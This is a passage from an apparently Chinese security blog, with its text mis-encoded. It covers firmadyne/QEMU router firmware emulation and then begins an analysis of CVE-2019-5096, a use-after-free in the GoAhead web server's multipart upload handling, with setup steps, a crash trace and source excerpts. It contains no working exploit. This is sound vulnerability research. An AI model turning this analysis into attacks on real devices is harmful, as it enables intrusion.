<p>ç™¾åº¦ä¸€ä¸‹æˆ‘æ‰¾åˆ°äº†æ–‡ç«  <a class="link"   href="https://blog.csdn.net/ai2000ai/article/details/79077506%EF%BC%8C%E6%96%87%E7%AB%A0%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%E4%BA%86%E5%90%84%E4%B8%AA%E7%BD%91%E5%8D%A1%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%90%AB%E4%B9%89%EF%BC%8C%E5%85%B6%E4%B8%AD%E7%9A%84%E4%B8%80%E5%BC%A0%E5%9B%BE%E7%89%87%E5%BE%88%E6%A3%92%EF%BC%9A" >https://blog.csdn.net/ai2000ai/article/details/79077506ï¼Œæ–‡ç« ç®€å•ä»‹ç»äº†å„ä¸ªç½‘å¡çš„åŸºæœ¬å«ä¹‰ï¼Œå…¶ä¸­çš„ä¸€å¼ å›¾ç‰‡å¾ˆæ£’ï¼š<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/firmadyne-2.png"
                     
                ></p>
<p>è¿™ä¸ªæ˜¯åç¡•å¾ˆæ—©çš„ä¸€æ¬¾ç½‘ç»œè®¾å¤‡ï¼Œé‡‡ç”¨ openwrt çš„ SoCã€‚</p>
<p>ç›®å‰å¸‚é¢ä¸Šå¤šæ•°è·¯ç”±å™¨ç½‘å¡ç»“æ„å’Œä¸Šå›¾ç±»ä¼¼ï¼Œeth0 æ˜¯å®é™…çš„ç‰©ç†ç½‘å¡ï¼Œå…¶å‘ä¸‹ä¼šåˆ†åˆ«è™šæ‹Ÿå‡º lan å£å’Œ wan å£ï¼Œå¦å¤–æ— çº¿éƒ¨åˆ†ä¹Ÿå¾ˆä¼šåŒºåˆ† 2.4G å’Œ 5G ç­‰ç­‰ã€‚</p>
<p>br-lan æ˜¯è™šæ‹Ÿè®¾å¤‡ï¼Œç”¨äº LAN å£çš„æ¡¥æ¥ã€‚ç®€è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬çš„ 846 å›ºä»¶é»˜è®¤åªå¼€å¯äº†ä¸€ä¸ªè™šæ‹Ÿæ¥å£(br-lan)ï¼Œç”šè‡³è¿ç¯å›æ¥å£éƒ½æ²¡æœ‰å¼€å¯ï¼Œåè®®æ ˆå¹¶æ²¡æœ‰æ­£å¸¸å·¥ä½œã€‚</p>
<p>æ‰¾åˆ°é—®é¢˜çš„åŸå› äº†ï¼Œå°è¯•æ‰‹åŠ¨å¼€å¯å„ä¸ªç½‘ç»œæ¥å£å¹¶åˆ†é… IP åœ°å€ã€‚å†æ¬¡è®¿é—®è¿˜æ˜¯ä¸è¡Œã€‚</p>
<p>åˆæŸ¥æ‰¾äº†ä¸€äº›èµ„æ–™ï¼Œå‘ç°å¯èƒ½æ˜¯ firmadyne çš„ç½‘ç»œé…ç½®ç­–ç•¥å‡ºç°é—®é¢˜ï¼Œåœ¨å®ƒè‡ªåŠ¨ç”Ÿæˆçš„è„šæœ¬ run.sh ä¸­ä¼šåˆ›å»º tap è™šæ‹Ÿç½‘å¡å¹¶åˆ›å»ºé€šå¾€ QEMU è™šæ‹Ÿæœºçš„è·¯ç”±ï¼Œä½†ç”±äºå›ºä»¶å†…éƒ¨å¹¶æ²¡æœ‰è‡ªåŠ¨å¯ç”¨ç½‘å¡ï¼Œè¿™æ¡è·¯ç”±æ— æ•ˆï¼Œå°±ç®—æ‰‹åŠ¨é…ç½®ä¹Ÿæ— æµäºäº‹ã€‚</p>
<p>äºæ˜¯ ä¿®æ”¹ run.sh è„šæœ¬</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">set -u</span><br><span class="line"></span><br><span class="line">ARCHEND=mipsel</span><br><span class="line">IID=1</span><br><span class="line"></span><br><span class="line">if [ -e ./firmadyne.config ]; then</span><br><span class="line">    source ./firmadyne.config</span><br><span class="line">elif [ -e ../firmadyne.config ]; then</span><br><span class="line">    source ../firmadyne.config</span><br><span class="line">elif [ -e ../../firmadyne.config ]; then</span><br><span class="line">    source ../../firmadyne.config</span><br><span class="line">else</span><br><span class="line">    echo &quot;Error: Could not find &#x27;firmadyne.config&#x27;!&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">IMAGE=`get_fs $&#123;IID&#125;`</span><br><span class="line">KERNEL=`get_kernel $&#123;ARCHEND&#125;`</span><br><span class="line">QEMU=`get_qemu $&#123;ARCHEND&#125;`</span><br><span class="line">QEMU_MACHINE=`get_qemu_machine $&#123;ARCHEND&#125;`</span><br><span class="line">QEMU_ROOTFS=`get_qemu_disk $&#123;ARCHEND&#125;`</span><br><span class="line">WORK_DIR=`get_scratch $&#123;IID&#125;`</span><br><span class="line"></span><br><span class="line">trap cleanup EXIT</span><br><span class="line"></span><br><span class="line">echo &quot;Starting firmware emulation... use Ctrl-a + x to exit&quot;</span><br><span class="line">sleep 1s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"> $</span><span class="language-bash">&#123;QEMU&#125; -m 256 -M <span class="variable">$&#123;QEMU_MACHINE&#125;</span> -kernel <span class="variable">$&#123;KERNEL&#125;</span> \</span></span><br><span class="line"><span class="language-bash">    -drive <span class="keyword">if</span>=ide,format=raw,file=<span class="variable">$&#123;IMAGE&#125;</span> -append <span class="string">&quot;root=<span class="variable">$&#123;QEMU_ROOTFS&#125;</span> console=ttyS0 nandsim.parts=64,64,64,64,64,64,64,64,64,64 rdinit=/firmadyne/preInit.sh rw debug ignore_loglevel print-fatal-signals=1 user_debug=31 firmadyne.syscall=0&quot;</span> \</span></span><br><span class="line"><span class="language-bash">    -nographic \</span></span><br><span class="line"><span class="language-bash">    -net nic -net tap,ifname=tap0,script=no,downscript=no | <span class="built_in">tee</span> <span class="variable">$&#123;WORK_DIR&#125;</span>/qemu.final.serial.log</span></span><br></pre></td></tr></table></figure></div>

<p>ç»“åˆä¹‹å‰å†™çš„ QEMU ç½‘ç»œé…ç½®æ‰‹åŠ¨åˆ›å»º tap è™šæ‹Ÿç½‘å¡å¹¶é€šè¿‡ç½‘æ¡¥çš„æ–¹å¼æ¥å…¥ QEMU è™šæ‹Ÿæœºï¼Œç„¶ååœ¨è™šæ‹Ÿæœºä¸­æ‰‹åŠ¨å¯ç”¨ eth0 ç­‰ç½‘å¡å¹¶åˆ†é… IP åœ°å€ã€‚</p>
<p>æ­¤æ—¶è™šæ‹Ÿæœºä¸­ç½‘å¡å¦‚ä¸‹:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/firmadyne-3.png"
                     
                ></p>
<p>æœ¬æœºç½‘å¡çŠ¶æ€</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">br0       Link encap:Ethernet  HWaddr 00:0c:29:90:94:18  </span><br><span class="line">          inet addr:192.168.166.138  Bcast:192.168.166.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fe90:9418/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:43207 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2301 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:12217527 (12.2 MB)  TX bytes:310242 (310.2 KB)</span><br><span class="line"></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:0c:29:90:94:18  </span><br><span class="line">          inet addr:192.168.166.139  Bcast:192.168.166.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fe90:9418/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:286100 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:71492 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:369617544 (369.6 MB)  TX bytes:10566787 (10.5 MB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:15207 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:15207 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1 </span><br><span class="line">          RX bytes:3129532 (3.1 MB)  TX bytes:3129532 (3.1 MB)</span><br><span class="line"></span><br><span class="line">tap0      Link encap:Ethernet  HWaddr 32:4e:1d:e9:33:5a  </span><br><span class="line">          inet6 addr: fe80::304e:1dff:fee9:335a/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:22279 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:20531 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:11080451 (11.0 MB)  TX bytes:1821983 (1.8 MB)</span><br></pre></td></tr></table></figure></div>

<p>åˆ°è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥æˆåŠŸè®¿é—® web ç®¡ç†ç•Œé¢ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/firmadyne-4.png"
                     
                ></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2019-5096</title>
    <url>/2019/12/23/CVE-2019-5096/</url>
    <content><![CDATA[<p>å¥½ä¹…æ²¡å†™åšå®¢äº†ï¼Œä¸€ç›´åœ¨å¿™è€ƒè¯•ä¹‹ç±»çš„äº‹æƒ…ï¼Œè¿™ä¸ªæœˆåˆï¼ˆ2019-12-02ï¼‰ Cisco çš„å®‰å…¨ä¸“å®¶æŠ«éœ²äº† GoAhead å¼€æº web æœåŠ¡ä¸­å­˜åœ¨ä¸¤ä¸ªæ¼æ´ï¼ŒCVE ç¼–å· 5096 å’Œ 5097ï¼Œ5096 æ˜¯ä¸€æš UAF æ¼æ´ï¼ˆå·ç§°èƒ½å¤Ÿè¾¾åˆ° RCEï¼‰ï¼Œ5097 æ˜¯ä¸€æš DDoS æ¼æ´ã€‚æˆ‘ä»¬ç®€å•åˆ†æä¸€ä¸‹ 5096.</p>
<span id="more"></span>

<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><ol>
<li>é¦–å…ˆå» GitHub clone ä¸‹æ¥ GoAhead çš„æºä»£ç </li>
</ol>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/embedthis/goahead</span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>æŸ¥æ‰¾æœ€è¿‘çš„æ›´æ–°ç‰ˆæœ¬ä¿¡æ¯</li>
</ol>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git log --pretty=oneline</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2019-5096-1.png"
                     
                ></p>
<ol start="3">
<li>å’Œæ­¤æ¼æ´æœ‰å…³çš„æ˜¯ FIX Issue #287ï¼Œé‚£ä¹ˆæˆ‘ä»¬é€‰æ‹©ç­¾å‡ºå…¶ä¹‹å‰çš„ä¸€ä¸ªç‰ˆæœ¬</li>
</ol>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git checkout f42afd767f90358908f5ef46b4e5bee8803d5ac5</span><br></pre></td></tr></table></figure></div>

<ol start="4">
<li>ä¿®æ”¹æºä»£ç ï¼Œæ‰“å¼€ osdep.c æ–‡ä»¶ï¼Œå°†å‡½æ•° websTempFile ä¿®æ”¹ä¸º</li>
</ol>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">PUBLIC <span class="type">char</span> *<span class="title function_">websTempFile</span><span class="params">(cchar *dir, cchar *prefix)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span>   sep;</span><br><span class="line"></span><br><span class="line">    sep = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!dir || *dir == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> WINCE</span></span><br><span class="line">        dir = <span class="string">&quot;/Temp&quot;</span>;</span><br><span class="line">        sep = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> ME_WIN_LIKE</span></span><br><span class="line">        dir = getenv(<span class="string">&quot;TEMP&quot;</span>);</span><br><span class="line">        sep = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> VXWORKS</span></span><br><span class="line">        dir = <span class="string">&quot;.&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        dir = <span class="string">&quot;/tmp&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!prefix) &#123;</span><br><span class="line">        prefix = <span class="string">&quot;tmp&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sfmt(<span class="string">&quot;/tmp%c%s-%d.tmp&quot;</span>, sep, prefix, count++);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol start="5">
<li>ç¼–è¯‘ç¨‹åºï¼Œç”¨ VSCode æ‰“å¼€ src æ–‡ä»¶å¤¹å‡†å¤‡åˆ†æã€‚</li>
</ol>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ build ç›®å½•ä¸‹ï¼Œæˆ‘ä»¬é¦–å…ˆåˆ†æä¸€ä¸‹æºä»£ç çš„å¤§è‡´é€»è¾‘ã€‚</p>
<p><em>PSï¼šVSCode å®‰è£…äº† C&#x2F;C++ æ’ä»¶çš„è¯å¯ä»¥å¾ˆæ–¹ä¾¿çš„æŸ¥æ‰¾å‡½æ•°å’Œå˜é‡çš„äº¤å‰å¼•ç”¨</em></p>
<p>æ ¹æ®<a class="link"   href="https://talosintelligence.com/vulnerability_reports/TALOS-2019-0888" >æŠ«éœ²ä¿¡æ¯<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œæ¼æ´å‘ç”Ÿçš„ä½ç½®æ˜¯ freeUploadFile å‡½æ•°ï¼Œåœ¨æ–‡ç« ä¸­è¿˜ç»™å‡ºäº†ç›¸å…³çš„å´©æºƒä¿¡æ¯ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">double free or corruption (fasttop)</span><br><span class="line"></span><br><span class="line">[#0] 0x7ffff6dc1e97 â†’ __GI_raise(sig=0x6)</span><br><span class="line">[#1] 0x7ffff6dc3801 â†’ __GI_abort()</span><br><span class="line">[#2] 0x7ffff6e0c897 â†’ __libc_message(action=do_abort, fmt=0x7ffff6f39b9a &quot;%s\n&quot;)</span><br><span class="line">[#3] 0x7ffff6e1390a â†’ malloc_printerr(str=0x7ffff6f3b828 &quot;double free or corruption (fasttop)&quot;)</span><br><span class="line">[#4] 0x7ffff6e1b004 â†’ _int_free(have_lock=0x0, p=0x611a00, av=0x7ffff716ec40 &lt;main_arena&gt;)</span><br><span class="line">[#5] 0x7ffff6e1b004 â†’ __GI___libc_free(mem=0x611a10)</span><br><span class="line">[#6] 0x7ffff7b6e897 â†’ freeUploadFile(up=0x611a50)</span><br><span class="line">[#7] 0x7ffff7b6e7fc â†’ websFreeUpload(wp=0x60d680)</span><br><span class="line">[#8] 0x7ffff7b62274 â†’ reuseConn(wp=0x60d680)</span><br><span class="line">[#9] 0x7ffff7b5e438 â†’ complete(wp=0x60d680, reuse=0x1)</span><br></pre></td></tr></table></figure></div>

<p>å¤§è‡´çš„å‡½æ•°è°ƒç”¨æµç¨‹æ˜¯ complete -&gt; reuseConn -&gt; websFreeUpload -&gt; freeUploadFile</p>
<p>ä½†æ˜¯æŒ‰ç…§è¿™æ ·çš„å‡½æ•°æµç¨‹æ‰¾ä¸‹å»çš„è¯ä½ ä¼šæ„Ÿè§‰å¾ˆç–‘æƒ‘ï¼Œå› ä¸ºä¸Šè¿°çš„å‡½æ•°è°ƒç”¨é“¾å¹¶ä¸åŒ…æ‹¬æ¼æ´çš„æ ¸å¿ƒä»£ç ã€‚</p>
<p>æˆ‘åœ¨åˆ†æè¿™ä¸ªæ¼æ´çš„æ—¶å€™æœ€åˆä¹Ÿæ˜¯æŒ‰ç…§è¿™ä¸ªæ¼æ´é¡ºåºæ‰¾ä¸‹å»çš„ï¼Œç»“æœä¸€æ— æ‰€è·ï¼Œç½‘ä¸Šå¯¥å¯¥å‡ ç¯‡åˆ†ææ–‡ç« åªæœ‰åªè¨€ç‰‡è¯­ï¼Œæ— å¥ˆåªèƒ½ä»å¤´äº†è§£å’Œè¿™ä¸ªæ¼æ´æœ‰å…³çš„ä¸€äº›çŸ¥è¯†ç‚¹ã€‚</p>
<p>é¦–å…ˆï¼Œæ ¹æ®æŠ«éœ²ä¿¡æ¯æˆ‘ä»¬çŸ¥é“è¿™ä¸ªæ¼æ´å’Œ multi-part&#x2F;form-data ç±»å‹çš„æ•°æ®æœ‰å…³ï¼Œå¼•ç”¨å…¶ä¸­çš„å‡ å¥è¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">When processing a multi-part/form-data HTTP request with multiple Content-Disposition headers in the same request, a use-after-free condition can occur while cleaning up the heap structures used for storing the different parts of the request.</span><br></pre></td></tr></table></figure></div>

<p>å¤§æ¦‚æ„æ€æ˜¯è¯´å½“ç¨‹åºå¤„ç† multi-part&#x2F;form-data æ ¼å¼æ•°æ®çš„æ—¶å€™å¯èƒ½ä¼šå‘ç”Ÿ UAFï¼Œé‚£ä¹ˆä»€ä¹ˆæ˜¯ multi-part&#x2F;form-data å‘¢ï¼Ÿ</p>
<p>ç™¾åº¦ç®€å•äº†è§£äº†ä¸€ä¸‹ï¼Œå®ƒæ˜¯ HTML ä¸‰ç§è¡¨å• enctype ç±»å‹ä¹‹ä¸€ï¼Œä¸»è¦ç”¨äºè§£å†³å‘æœåŠ¡å™¨ä¼ è¾“äºŒè¿›åˆ¶æ•°æ®çš„é—®é¢˜ï¼Œå…¶å…·ä½“å®šä¹‰åœ¨ RFC2388 ä¸­ã€‚è¯¦ç»†ä¿¡æ¯ï¼š<a class="link"   href="https://blog.csdn.net/wyn126/article/details/96451357" >https://blog.csdn.net/wyn126/article/details/96451357<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>ç®€å•æ¥è¯´å®ƒæ˜¯ä¸€ç§ç‰¹æ®Šçš„æ•°æ®ä¼ è¾“æ ¼å¼ï¼Œå…¶åŸºæœ¬ç»“æ„æ˜¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--banner</span><br><span class="line">data header...</span><br><span class="line"></span><br><span class="line">data</span><br><span class="line">--banner</span><br><span class="line">data header...</span><br><span class="line"></span><br><span class="line">data</span><br><span class="line">--banner--</span><br></pre></td></tr></table></figure></div>

<p>åˆ©ç”¨ banner åˆ†å‰²å¼€ä¸åŒçš„æ•°æ®å—ï¼Œæ¯ä¸ªæ•°æ®å—è¡¨ç¤ºä¸€ä¸ª HTML è¡¨å•ã€‚æ•°æ®å—åŸºæœ¬æ ¼å¼åˆåŒ…æ‹¬ header å’Œæ•°æ®æœ¬ä½“ã€‚å¤„ç†èµ·æ¥çš„åŸºæœ¬æ€è·¯å°±æ˜¯ è¯»å– åˆ†å‰²è¡Œbanner â€“&gt; è¯»å– data header â€“&gt; è¯»å– data â€“&gt; å¯»æ‰¾ä¸‹ä¸€ä¸ª bannerâ€¦   å¾ªç¯å¤„ç†ç›´åˆ° banner ç»“æŸä¸ºæ­¢ã€‚</p>
<p>äº†è§£åŸºæœ¬ä¿¡æ¯ä¹‹åæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ GoAhead åœ¨å¤„ç†è¯·æ±‚çš„æ—¶å€™åˆ°åº•åšäº†ä»€ä¹ˆï¼Ÿ</p>
<p>ä¸»å…¥å£å‡½æ•°ä½äº http.c ä¸­ï¼Œæˆ‘ä»¬æš‚ä¸”ä¸è°ˆ socket éƒ¨åˆ†ï¼Œé‚£ä¹ˆå…¥å£å‡½æ•°å°±æ˜¯ websPump()ï¼Œè¿™ä¸ªå‡½æ•°å°†å¤„ç†è¯·æ±‚çš„è¿‡ç¨‹ç®€å•åˆ†ä¸º 5 ä¸ªæ­¥éª¤ï¼Œæ‘˜å½•æºä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">PUBLIC <span class="type">void</span> <span class="title function_">websPump</span><span class="params">(Webs *wp)</span>   <span class="comment">// æ ¹æ®ä¸åŒçš„è¯»å–æ ‡å¿—ï¼Œè°ƒç”¨ä¸åŒçš„å¤„ç†å‡½æ•°</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">bool</span>    canProceed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (canProceed = <span class="number">1</span>; canProceed; ) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (wp-&gt;state) &#123;</span><br><span class="line">        <span class="keyword">case</span> WEBS_BEGIN:     <span class="comment">// å¤„ç†è¯·æ±‚å¤´</span></span><br><span class="line">            canProceed = parseIncoming(wp);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WEBS_CONTENT:    <span class="comment">// å¤„ç†è¯·æ±‚ä½“</span></span><br><span class="line">            canProceed = processContent(wp);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WEBS_READY:  </span><br><span class="line">            <span class="keyword">if</span> (!websRunRequest(wp)) &#123;</span><br><span class="line">                <span class="comment">/* Reroute if the handler re-wrote the request */</span></span><br><span class="line">                websRouteRequest(wp);</span><br><span class="line">                wp-&gt;state = WEBS_READY;</span><br><span class="line">                canProceed = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            canProceed = (wp-&gt;state != WEBS_RUNNING);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WEBS_RUNNING:</span><br><span class="line">            <span class="comment">/* Nothing to do until websDone is called */</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">case</span> WEBS_COMPLETE:    <span class="comment">// è¯·æ±‚å®Œæˆ</span></span><br><span class="line">            canProceed = complete(wp, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>5 ä¸ªé˜¶æ®µåˆ†åˆ«æ˜¯ BEGINã€CONTENTã€READYã€RUNNINGã€COMPLETEã€‚ä»å­—é¢ä¸Šå¯ç†è§£ä¸º å¼€å§‹-&gt;æ¥å—æ•°æ®-&gt;å‡†å¤‡å®Œæˆ-&gt;å¤„ç†é˜¶æ®µ-&gt;å¤„ç†å®Œæˆæ”¶å°¾ã€‚</p>
<p>é¦–å…ˆæ¥çœ‹ parseIncoming å‡½æ•°ï¼Œå¤§æ¦‚é€šè¯»ä¸€ä¸‹è¿™ä¸ªå‡½æ•°å®ç°äº†ä¸€äº›åˆå§‹åŒ–æ“ä½œï¼Œè§£æè¯·æ±‚ï¼Œæ„é€  Webs ç»“æ„ä½“ç­‰ã€‚</p>
<p>processContent å‡½æ•°æ˜¯æˆ‘ä»¬çš„ä¸»è¦å…³æ³¨ç‚¹ï¼Œå› ä¸ºå®ƒå’Œæˆ‘ä»¬ä¼ å…¥çš„æ•°æ®æ¯æ¯ç›¸å…³ï¼Œæºä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">processContent</span><span class="params">(Webs *wp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">bool</span>    canProceed;</span><br><span class="line"></span><br><span class="line">    canProceed = filterChunkData(wp);    <span class="comment">// å¤„ç†åˆ†å—çš„æ•°æ®ï¼Ÿ</span></span><br><span class="line">    <span class="keyword">if</span> (!canProceed || wp-&gt;finalized) &#123;</span><br><span class="line">        <span class="keyword">return</span> canProceed;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ME_GOAHEAD_UPLOAD</span></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;flags &amp; WEBS_UPLOAD) &#123;    <span class="comment">// å¦‚æœè¯·æ±‚çš„ç±»å‹æ˜¯  multipart/form-data</span></span><br><span class="line">        canProceed = websProcessUploadData(wp);    <span class="comment">// æ ¹æ®æŠ«éœ²ä¿¡æ¯æ¥çœ‹ï¼Œå¯èƒ½çš„æ¼æ´å…¥å£</span></span><br><span class="line">        <span class="keyword">if</span> (!canProceed || wp-&gt;finalized) &#123;</span><br><span class="line">            <span class="keyword">return</span> canProceed;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !ME_ROM</span></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;putfd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        canProceed = websProcessPutData(wp);</span><br><span class="line">        <span class="keyword">if</span> (!canProceed || wp-&gt;finalized) &#123;</span><br><span class="line">            <span class="keyword">return</span> canProceed;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ME_GOAHEAD_CGI</span></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;cgifd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        canProceed = websProcessCgiData(wp);</span><br><span class="line">        <span class="keyword">if</span> (!canProceed || wp-&gt;finalized) &#123;</span><br><span class="line">            <span class="keyword">return</span> canProceed;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;eof) &#123;</span><br><span class="line">        wp-&gt;state = WEBS_READY;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Prevent reading content from the next request</span></span><br><span class="line"><span class="comment">            The handler may not have been created if all the content was read in the initial read. No matter.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        socketDeleteHandler(wp-&gt;sid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> canProceed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ­¤å‡½æ•°æ¥å— Webs ç»“æ„ä½“ä½œä¸ºå‚æ•°ï¼Œè¿™ä¸ªç»“æ„ä½“ç”±ç”¨æˆ·ä¼ å…¥çš„è¯·æ±‚æŠ½è±¡è€Œæˆï¼Œä¹‹åçš„å¤§éƒ¨åˆ†æ“ä½œéƒ½å›´ç»•ç€è¿™ä¸ªç»“æ„ä½“è¿›è¡Œï¼Œåœ¨ VSCode ä¸­å¯ä»¥çœ‹åˆ°æ­¤ç»“æ„ä½“çš„å…·ä½“å®šä¹‰ã€‚</p>
<p>ä¸»è¦å…³æ³¨æ­¤å‡½æ•°çš„</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> ME_GOAHEAD_UPLOAD</span></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;flags &amp; WEBS_UPLOAD) &#123;    <span class="comment">// å¦‚æœè¯·æ±‚çš„ç±»å‹æ˜¯  multipart/form-data</span></span><br><span class="line">        canProceed = websProcessUploadData(wp);    <span class="comment">// æ ¹æ®æŠ«éœ²ä¿¡æ¯æ¥çœ‹ï¼Œå¯èƒ½çš„æ¼æ´å…¥å£</span></span><br><span class="line">        <span class="keyword">if</span> (!canProceed || wp-&gt;finalized) &#123;</span><br><span class="line">            <span class="keyword">return</span> canProceed;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span 